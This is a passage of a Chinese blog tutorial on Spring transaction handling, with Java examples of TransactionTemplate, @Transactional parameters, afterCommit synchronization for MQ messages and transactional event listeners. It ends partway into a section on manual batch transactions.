<li><strong>记录日志</strong>：业务失败了也想记录日志，但事务回滚了日志也没了</li>
<li><strong>隔离级别/超时</strong>：不知道<code>@Transactional</code>那些参数怎么用</li>
</ol>
<p>这篇文章会用实际代码演示6种解决方案。</p>
<h3 data-id="heading-2">目录</h3>
<ul>
<li><a href="#%E7%BC%96%E7%A8%8B%E5%BC%8F%E4%BA%8B%E5%8A%A1%E5%8C%BA%E5%88%86%E4%B8%9A%E5%8A%A1%E5%A4%B1%E8%B4%A5%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8" title="#%E7%BC%96%E7%A8%8B%E5%BC%8F%E4%BA%8B%E5%8A%A1%E5%8C%BA%E5%88%86%E4%B8%9A%E5%8A%A1%E5%A4%B1%E8%B4%A5%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8">编程式事务：区分业务失败和系统异常</a></li>
<li><a href="#transactional%E7%9A%84%E5%8F%82%E6%95%B0%E6%88%91%E8%A2%AB%E5%9D%91%E8%BF%87" title="#transactional%E7%9A%84%E5%8F%82%E6%95%B0%E6%88%91%E8%A2%AB%E5%9D%91%E8%BF%87">@Transactional参数：隔离级别和超时</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E6%8F%90%E4%BA%A4%E5%90%8E%E5%8F%91mq%E6%88%91%E4%B9%8B%E5%89%8D%E9%83%BD%E5%81%9A%E9%94%99%E4%BA%86" title="#%E4%BA%8B%E5%8A%A1%E6%8F%90%E4%BA%A4%E5%90%8E%E5%8F%91mq%E6%88%91%E4%B9%8B%E5%89%8D%E9%83%BD%E5%81%9A%E9%94%99%E4%BA%86">事务同步器：提交后发MQ</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E8%A7%A3%E8%80%A6%E5%89%AF%E4%BD%9C%E7%94%A8%E6%93%8D%E4%BD%9C" title="#%E4%BA%8B%E5%8A%A1%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E8%A7%A3%E8%80%A6%E5%89%AF%E4%BD%9C%E7%94%A8%E6%93%8D%E4%BD%9C">事务事件监听：解耦副作用操作</a></li>
<li><a href="#%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C%E5%BF%85%E9%A1%BB%E7%94%A8%E6%89%8B%E5%8A%A8%E4%BA%8B%E5%8A%A1" title="#%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C%E5%BF%85%E9%A1%BB%E7%94%A8%E6%89%8B%E5%8A%A8%E4%BA%8B%E5%8A%A1">手动控制事务：批量操作</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E6%9C%BA%E5%88%B63%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF" title="#%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E6%9C%BA%E5%88%B63%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF">事务传播机制：3种常用场景</a></li>
</ul>
<h3 data-id="heading-3">关于demo项目</h3>
<p>本文代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fsh_wangwanbao%2Fsimple-transactional" target="_blank" title="https://gitee.com/sh_wangwanbao/simple-transactional" ref="nofollow noopener noreferrer">gitee.com/sh_wangwanb…</a></p>
<p><strong>特点</strong>：集成测试框架，通过反射自动构建参数，启动即测试，自动生成markdown报告。不用手动准备数据，不用一个个跑测试用例。</p>
<p>导入数据库脚本（doc/simple-transactional-init.sql），改下配置，启动项目就能看到完整测试结果。</p>
<hr/>
<h3 data-id="heading-4">编程式事务：区分业务失败和系统异常</h3>
<p>这是我在Mall里发现的一个场景：订单创建后要调用风控服务检查。</p>
<ul>
<li><strong>风控不通过</strong>（业务规则）：订单要保留，标记"待审核"，人工复核</li>
<li><strong>风控服务挂了</strong>（系统故障）：订单要回滚，不能留脏数据</li>
</ul>
<p><strong>用<code>@Transactional</code>做不到</strong>。因为它只能靠抛异常触发回滚，无法区分这两种情况。</p>
<h4 data-id="heading-5">TransactionTemplate可以动态控制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> OrderResult <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderParam param)</span> {
    
    <span class="hljs-keyword">return</span> transactionTemplate.execute(status -&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 创建订单</span>
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> buildOrder(param);
            orderMapper.insert(order);
            
            <span class="hljs-comment">// 2. 创建订单商品</span>
            List&lt;OrderItem&gt; items = buildOrderItems(order);
            orderItemMapper.batchInsert(items);
            
            <span class="hljs-comment">// 3. 锁定库存</span>
            lockStock(param.getItems());
            
            <span class="hljs-comment">// 4. 调用风控服务检查</span>
            <span class="hljs-type">RiskCheckResult</span> <span class="hljs-variable">riskResult</span> <span class="hljs-operator">=</span> riskService.check(order);
            
            <span class="hljs-keyword">if</span> (!riskResult.isPass()) {
                <span class="hljs-comment">// 风控不通过 - 业务失败，但不回滚</span>
                order.setStatus(OrderStatus.WAIT_AUDIT);  <span class="hljs-comment">// 待审核</span>
                order.setNote(<span class="hljs-string">"风控检查未通过："</span> + riskResult.getReason());
                orderMapper.updateById(order);
                
                <span class="hljs-comment">// 关键：不调用 status.setRollbackOnly()</span>
                <span class="hljs-comment">// 订单和商品明细都会保留</span>
                <span class="hljs-keyword">return</span> OrderResult.fail(<span class="hljs-string">"订单需人工审核"</span>);
            }
            
            <span class="hljs-comment">// 风控通过，订单正常</span>
            <span class="hljs-keyword">return</span> OrderResult.success(order.getId());
            
        } <span class="hljs-keyword">catch</span> (RiskServiceException e) {
            <span class="hljs-comment">// 风控服务异常 - 系统故障，必须回滚</span>
            log.error(<span class="hljs-string">"风控服务异常"</span>, e);
            status.setRollbackOnly();
            <span class="hljs-keyword">return</span> OrderResult.error(<span class="hljs-string">"系统异常，请稍后重试"</span>);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 其他异常也回滚</span>
            status.setRollbackOnly();
            <span class="hljs-keyword">return</span> OrderResult.error(e.getMessage());
        }
    });
}
</code></pre>
<h4 data-id="heading-6">画个图就明白了</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[开始事务] --&gt; B[创建订单]
    B --&gt; C[创建订单商品]
    C --&gt; D[锁定库存]
    D --&gt; E[调用风控服务]
    
    E --&gt; F{风控结果?}
    
    F --&gt;|不通过-业务失败| G[更新订单状态=待审核]
    G --&gt; H[提交事务]
    H --&gt; I[订单保留,状态=待审核]
    
    F --&gt;|通过| J[提交事务]
    J --&gt; K[订单正常创建]
    
    F --&gt;|服务异常-系统故障| L[setRollbackOnly]
    L --&gt; M[回滚事务]
    M --&gt; N[订单被删除]
</code></pre>
<h4 data-id="heading-7">这才是编程式事务的价值</h4>

























<table><thead><tr><th>场景</th><th>@Transactional</th><th>TransactionTemplate</th></tr></thead><tbody><tr><td>风控不通过</td><td>抛异常→全回滚</td><td>不回滚，保留订单</td></tr><tr><td>风控服务挂了</td><td>抛异常→全回滚</td><td>回滚，不留脏数据</td></tr><tr><td>库存不足</td><td>抛异常→全回滚</td><td>保留订单，标记"待补货"</td></tr></tbody></table>
<p><strong>核心区别</strong>：能区分"业务失败"和"系统异常"，动态决定要不要回滚。</p>
<p>我测试了一下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试风控不通过（高金额订单）</span>
POST /programmatic/risk-check

<span class="hljs-comment"># 结果</span>
订单ID：8
订单状态：待审核
订单备注：风控检查未通过：金额过高
数据库：订单和商品明细都保留了
</code></pre>
<p>这玩意儿我之前真不知道能这么用。</p>
<h3 data-id="heading-8">@Transactional的参数，我被坑过</h3>
<p>Mall的商品创建方法是这么写的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(
    isolation = Isolation.REPEATABLE_READ,    
    propagation = Propagation.REQUIRED,      
    timeout = 30,                            
    rollbackFor = Exception.class            
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">createProduct</span><span class="hljs-params">(ProductParam param)</span> {
    <span class="hljs-comment">// 插入8张表...</span>
}
</code></pre>
<p>我之前都是直接<code>@Transactional</code>，从来不加参数。后来踩了几次坑才知道这些参数的用处。</p>
<h4 data-id="heading-9">isolation这个参数要注意</h4>
<p>有次数据库从MySQL换成PostgreSQL，突然出现了幻读问题。</p>
<p>原因是：</p>
<ul>
<li>MySQL默认 <code>REPEATABLE_READ</code>（可重复读）</li>
<li>PostgreSQL默认 <code>READ_COMMITTED</code>（读已提交）</li>
</ul>
<p><strong>如果代码里没显式指定隔离级别，换数据库就可能出问题。</strong></p>
<p>所以建议：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 明确指定隔离级别，不依赖数据库默认值</span>
<span class="hljs-meta">@Transactional(isolation = Isolation.REPEATABLE_READ)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">someMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 避免环境切换导致行为变化</span>
}
</code></pre>
<h4 data-id="heading-10">timeout和rollbackFor简单说两句</h4>
<p><strong>timeout</strong>：防止长事务锁表</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(timeout = 30)</span>  <span class="hljs-comment">// 30秒超时</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complexTask</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>rollbackFor</strong>：Spring默认只有RuntimeException才回滚，Checked Exception不回滚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>  <span class="hljs-comment">// 明确指定</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>这两个参数记得加上，能避免很多坑。</p>
<h3 data-id="heading-11">事务提交后发MQ，我之前都做错了</h3>
<p>订单创建成功后，要发个MQ消息（30分钟后自动取消未支付订单）。</p>
<p>我之前是这么写的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 直接发MQ</span>
    mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, order.getId());
}
</code></pre>
<p>看起来没问题吧？实际上有个致命问题。</p>
<h4 data-id="heading-12">问题出在时机上</h4>
<p>画个图就明白了：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Service
    participant DB as Database
    participant MQ as RabbitMQ
    
    rect rgb(255, 240, 240)
    Note over S,MQ: 错误的做法
    S-&gt;&gt;DB: 1. INSERT订单
    Note over DB: 数据在事务内&lt;br/&gt;还没提交
    
    S-&gt;&gt;MQ: 2. 发送MQ消息
    Note over MQ: 消息已发出
    
    S-&gt;&gt;DB: 3. 后面某步失败
    DB--&gt;&gt;S: 4. 事务回滚
    Note over DB: 订单被删除
    
    Note over MQ,DB: 问题：消息发了&lt;br/&gt;但数据没了
    end
</code></pre>
<p><strong>问题本质</strong>：MQ消息发出去了，但事务回滚了，订单根本不存在。30分钟后消费者去取消订单，发现订单不存在。</p>
<p>这就是<strong>副作用的时机与事务一致性</strong>问题：</p>
<ul>
<li>订单插入、库存扣减 → 在同一个事务里，要么全成功，要么全回滚</li>
<li>MQ消息 → 不在这个事务里，发出去就收不回来了</li>
</ul>
<h4 data-id="heading-13">事务同步器解决这个问题</h4>
<p>Spring提供了事务生命周期的钩子，让你在特定阶段执行回调：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 注册事务同步器</span>
    TransactionSynchronizationManager.registerSynchronization(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionSynchronization</span>() {
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// 只有事务提交成功，这里才会执行</span>
                mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, order.getId());
                log.info(<span class="hljs-string">"MQ消息已发送"</span>);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span> {
                <span class="hljs-keyword">if</span> (status == STATUS_ROLLED_BACK) {
                    log.info(<span class="hljs-string">"事务回滚，MQ消息不会发送"</span>);
                }
            }
        }
    );
}
</code></pre>
<p>现在的时序是这样：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Service
    participant DB as Database
    participant MQ as RabbitMQ
    
    rect rgb(240, 255, 240)
    Note over S,MQ: 正确的做法
    S-&gt;&gt;DB: 1. INSERT订单
    S-&gt;&gt;S: 2. 注册afterCommit回调
    
    alt 事务成功
        S-&gt;&gt;DB: 3. COMMIT
        Note over DB: 数据已持久化
        S-&gt;&gt;MQ: 4. 触发afterCommit&lt;br/&gt;发送MQ消息
        Note over MQ: 数据和消息一致
    else 事务失败
        S-&gt;&gt;DB: 3. ROLLBACK
        Note over DB: 数据被删除
        Note over S: afterCommit不执行
        Note over MQ: 消息不会发送
    end
    end
</code></pre>
<p><strong>核心区别</strong>：只有订单真正提交到数据库后，才发MQ消息。事务回滚了，消息就不发。</p>
<h4 data-id="heading-14">4个生命周期钩子</h4>
<p>事务同步器提供了4个回调点：</p>
<pre><code class="hljs language-java" lang="java">TransactionSynchronizationManager.registerSynchronization(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionSynchronization</span>() {
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> readOnly)</span> {
            log.info(<span class="hljs-string">"【阶段1-beforeCommit】事务即将提交"</span>);
            <span class="hljs-comment">// 最后的数据校验</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCompletion</span><span class="hljs-params">()</span> {
            log.info(<span class="hljs-string">"【阶段2-beforeCompletion】事务即将完成"</span>);
            <span class="hljs-comment">// 清理临时资源</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
            log.info(<span class="hljs-string">"【阶段3-afterCommit】事务已提交"</span>);
            <span class="hljs-comment">// 发MQ、清缓存（数据已持久化）</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">statusStr</span> <span class="hljs-operator">=</span> (status == STATUS_COMMITTED) ? <span class="hljs-string">"提交"</span> : <span class="hljs-string">"回滚"</span>;
            log.info(<span class="hljs-string">"【阶段4-afterCompletion】事务已完成，状态：{}"</span>, statusStr);
        }
    }
);
</code></pre>
<p>执行顺序是固定的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[开始事务] --&gt; B[业务逻辑执行]
    B --&gt; C{要提交?}
    
    C --&gt;|是| D[beforeCommit]
    D --&gt; E[beforeCompletion]
    E --&gt; F[COMMIT]
    F --&gt; G[afterCommit]
    G --&gt; H[afterCompletion状态COMMITTED]
    
    C --&gt;|否| I[beforeCompletion]
    I --&gt; J[ROLLBACK]
    J --&gt; K[afterCompletion状态ROLLED_BACK]
</code></pre>
<h4 data-id="heading-15">哪些场景必须用afterCommit</h4>
<p>所有"对外的副作用"都应该放在afterCommit里：</p>
<p><strong>场景1：发MQ消息</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 延迟取消订单</span>
    mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, orderId);
}
</code></pre>
<p><strong>场景2：清理缓存</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 清理商品缓存</span>
    redisTemplate.delete(<span class="hljs-string">"product:"</span> + productId);
}
</code></pre>
<p><strong>场景3：记录日志到另一个库</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 写到日志库（不在当前事务）</span>
    logMapper.insert(businessLog);
}
</code></pre>
<p><strong>场景4：调用外部服务</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 通知第三方</span>
    thirdPartyService.notify(order);
}
</code></pre>
<p><strong>核心原则</strong>：只有订单数据真正持久化了，外部世界才能知道。</p>
<h4 data-id="heading-16">同库的日志也要用afterCommit吗？</h4>
<p>理论上，如果日志表和订单表在同一个数据库、同一个事务里，写早了会一起回滚，不会有问题。</p>
<p>但实际业务中，我们希望：</p>
<ol>
<li><strong>解耦</strong>：订单业务和日志记录分离</li>
<li><strong>性能</strong>：日志操作不影响主事务耗时</li>
<li><strong>重试</strong>：日志失败可以独立重试，不影响订单</li>
</ol>
<p>所以建议还是放在afterCommit里。</p>
<h4 data-id="heading-17">我测试了一下</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 运行测试</span>
POST /synchronization/phases

<span class="hljs-comment"># 控制台输出</span>
【阶段1-beforeCommit】事务即将提交
【阶段2-beforeCompletion】事务即将完成
【阶段3-afterCommit】事务已提交
【阶段4-afterCompletion】事务已完成，状态：提交
MQ消息已发送
</code></pre>
<p>顺序是固定的，非常可靠。</p>
<h3 data-id="heading-18">事务事件监听：解耦副作用操作</h3>
<p>订单创建成功后，要做3件事：发MQ、记录日志、发通知。</p>
<p>如果都写在一个方法里，代码会很臃肿：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 业务逻辑越来越多</span>
    mqSender.send(...);
    logService.save(...);
    notifyService.send(...);
}
</code></pre>
<p>而且事务范围太大了，发短信也在事务里？</p>
<h4 data-id="heading-19">事务事件监听可以解耦</h4>
<p><strong>第1步：定义事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Getter</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> {
    <span class="hljs-keyword">private</span> String orderSn;
    <span class="hljs-keyword">private</span> Long memberId;
    <span class="hljs-keyword">private</span> BigDecimal amount;
}
</code></pre>
<p><strong>第2步：发布事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderParam param)</span> {
        <span class="hljs-comment">// 创建订单</span>
        orderMapper.insert(order);
        
        <span class="hljs-comment">// 发布事件（立即发布，但监听器何时处理取决于监听方式）</span>
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(
            order.getOrderSn(),
            order.getMemberId(),
            order.getTotalAmount()
        );
        eventPublisher.publishEvent(event);
        
        log.info(<span class="hljs-string">"事件已发布"</span>);
    }
}
</code></pre>
<p><strong>第3步：监听事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
    
    <span class="hljs-comment">// 关键：@TransactionalEventListener + AFTER_COMMIT</span>
    <span class="hljs-comment">// 事件会被"挂起"，等事务提交成功后才处理</span>
    <span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        log.info(<span class="hljs-string">"监听到订单创建：{}"</span>, event.getOrderSn());
        
        <span class="hljs-comment">// 这些操作在事务提交后才执行</span>
        mqSender.send(<span class="hljs-string">"order.cancel"</span>, event.getOrderSn());
        logMapper.insert(log);
        notifyService.send(event.getMemberId());
    }
    
    <span class="hljs-comment">// 事务回滚后执行</span>
    <span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_ROLLBACK)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderFailed</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        log.info(<span class="hljs-string">"订单创建失败：{}"</span>, event.getOrderSn());
    }
}
</code></pre>
<h4 data-id="heading-20">事件发布与事务的关系</h4>
<p>这里容易混淆的点：<strong><code>publishEvent</code>本身与事务无关，但监听器的执行时机取决于监听方式。</strong></p>
<p>画个图说明：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as OrderService
    participant E as EventPublisher
    participant L1 as @EventListener&lt;br/&gt;普通监听器
    participant L2 as @TransactionalEventListener&lt;br/&gt;AFTER_COMMIT
    participant DB as Database
    
    rect rgb(255, 245, 240)
    Note over S,DB: 方法有 @Transactional
    S-&gt;&gt;DB: 1. INSERT订单
    S-&gt;&gt;E: 2. publishEvent(event)
    
    E-&gt;&gt;L1: 3. 立即同步调用
    Note over L1: 普通监听器立即执行&lt;br/&gt;此时事务还没提交
    
    E-&gt;&gt;L2: 4. 事件挂起
    Note over L2: AFTER_COMMIT监听器不执行&lt;br/&gt;等待事务提交
    
    alt 事务提交成功
        S-&gt;&gt;DB: 5. COMMIT
        DB-&gt;&gt;L2: 6. 触发AFTER_COMMIT
        Note over L2: 监听器执行&lt;br/&gt;数据已持久化
    else 事务回滚
        S-&gt;&gt;DB: 5. ROLLBACK
        Note over L2: AFTER_COMMIT不执行
    end
    end
</code></pre>
<p><strong>关键区别</strong>：</p>

























<table><thead><tr><th>监听方式</th><th>执行时机</th><th>事务回滚影响</th></tr></thead><tbody><tr><td>@EventListener</td><td>立即执行</td><td>已执行的副作用无法撤销</td></tr><tr><td>@TransactionalEventListener(AFTER_COMMIT)</td><td>事务提交后</td><td>事务回滚则不执行</td></tr><tr><td>@TransactionalEventListener(AFTER_ROLLBACK)</td><td>事务回滚后</td><td>只有回滚才执行</td></tr></tbody></table>
<h4 data-id="heading-21">4个事务阶段</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 提交前（做最后校验）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.BEFORE_COMMIT)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCommit</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 事务即将提交，可以做最后校验</span>
}

<span class="hljs-comment">// 提交后（发副作用）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 数据已持久化，可以安全地发MQ、清缓存</span>
}

<span class="hljs-comment">// 回滚后（记录失败）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_ROLLBACK)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterRollback</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 事务失败了，记录失败日志</span>
}

<span class="hljs-comment">// 完成后（清理资源）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMPLETION)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 无论成功失败都会执行</span>
}
</code></pre>
<h4 data-id="heading-22">几个要注意的地方</h4>
<p><strong>1. 必须在事务方法里发布</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：方法没有 @Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// AFTER_COMMIT监听器不会触发！</span>
}

<span class="hljs-comment">// 正确：方法有 @Transactional</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// 监听器会在提交后触发</span>
}
</code></pre>
<p><strong>2. 子事务的事件跟随子事务</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parentMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 父事务</span>
    
    childMethod();  <span class="hljs-comment">// 子事务（REQUIRES_NEW）</span>
}

<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">childMethod</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// 监听器跟随子事务的提交</span>
}
</code></pre>
<p><strong>3. 如果没有事务怎么办</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 监听器默认不执行，除非加 fallbackExecution=true</span>
<span class="hljs-meta">@TransactionalEventListener(
    phase = TransactionPhase.AFTER_COMMIT,
    fallbackExecution = true  // 没有事务也会执行
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-23">对比事务同步器</h4>























<table><thead><tr><th>方式</th><th>代码耦合度</th><th>扩展性</th><th>适用场景</th></tr></thead><tbody><tr><td>TransactionSynchronization</td><td>高（在方法里注册）</td><td>低</td><td>简单场景，1-2个操作</td></tr><tr><td>@TransactionalEventListener</td><td>低（发布订阅）</td><td>高</td><td>复杂场景，多个操作</td></tr></tbody></table>
<p><strong>我的建议</strong>：</p>
<ul>
<li>只有1-2个操作，用TransactionSynchronization</li>
<li>有多个操作，或者可能扩展，用@TransactionalEventListener</li>
</ul>
<p>好处是代码解耦了，要加新功能，写个监听器就行，不用改原方法。</p>
<h3 data-id="heading-24">批量操作必须用手动事务</h3>
<p>批量发货100个订单，其中1个失败了咋办？</p>
<p>如果用<code>@Transactional</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDelivery</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
    <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
        <span class="hljs-comment">// 发货逻辑</span>
    }
}
</code></pre>
<p>问题：100个订单在一个事务里，1个失败全部回滚。</p>
<p>但实际需求是：<strong>成功的正常发货，失败的记录下来。</strong></p>
<h4 data-id="heading-25">用PlatformTransactionManager手动控制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderBatchService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> PlatformTransactionManager transactionManager;
    
    <span class="hljs-keyword">public</span> BatchResult <span class="hljs-title function_">batchDelivery</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
        
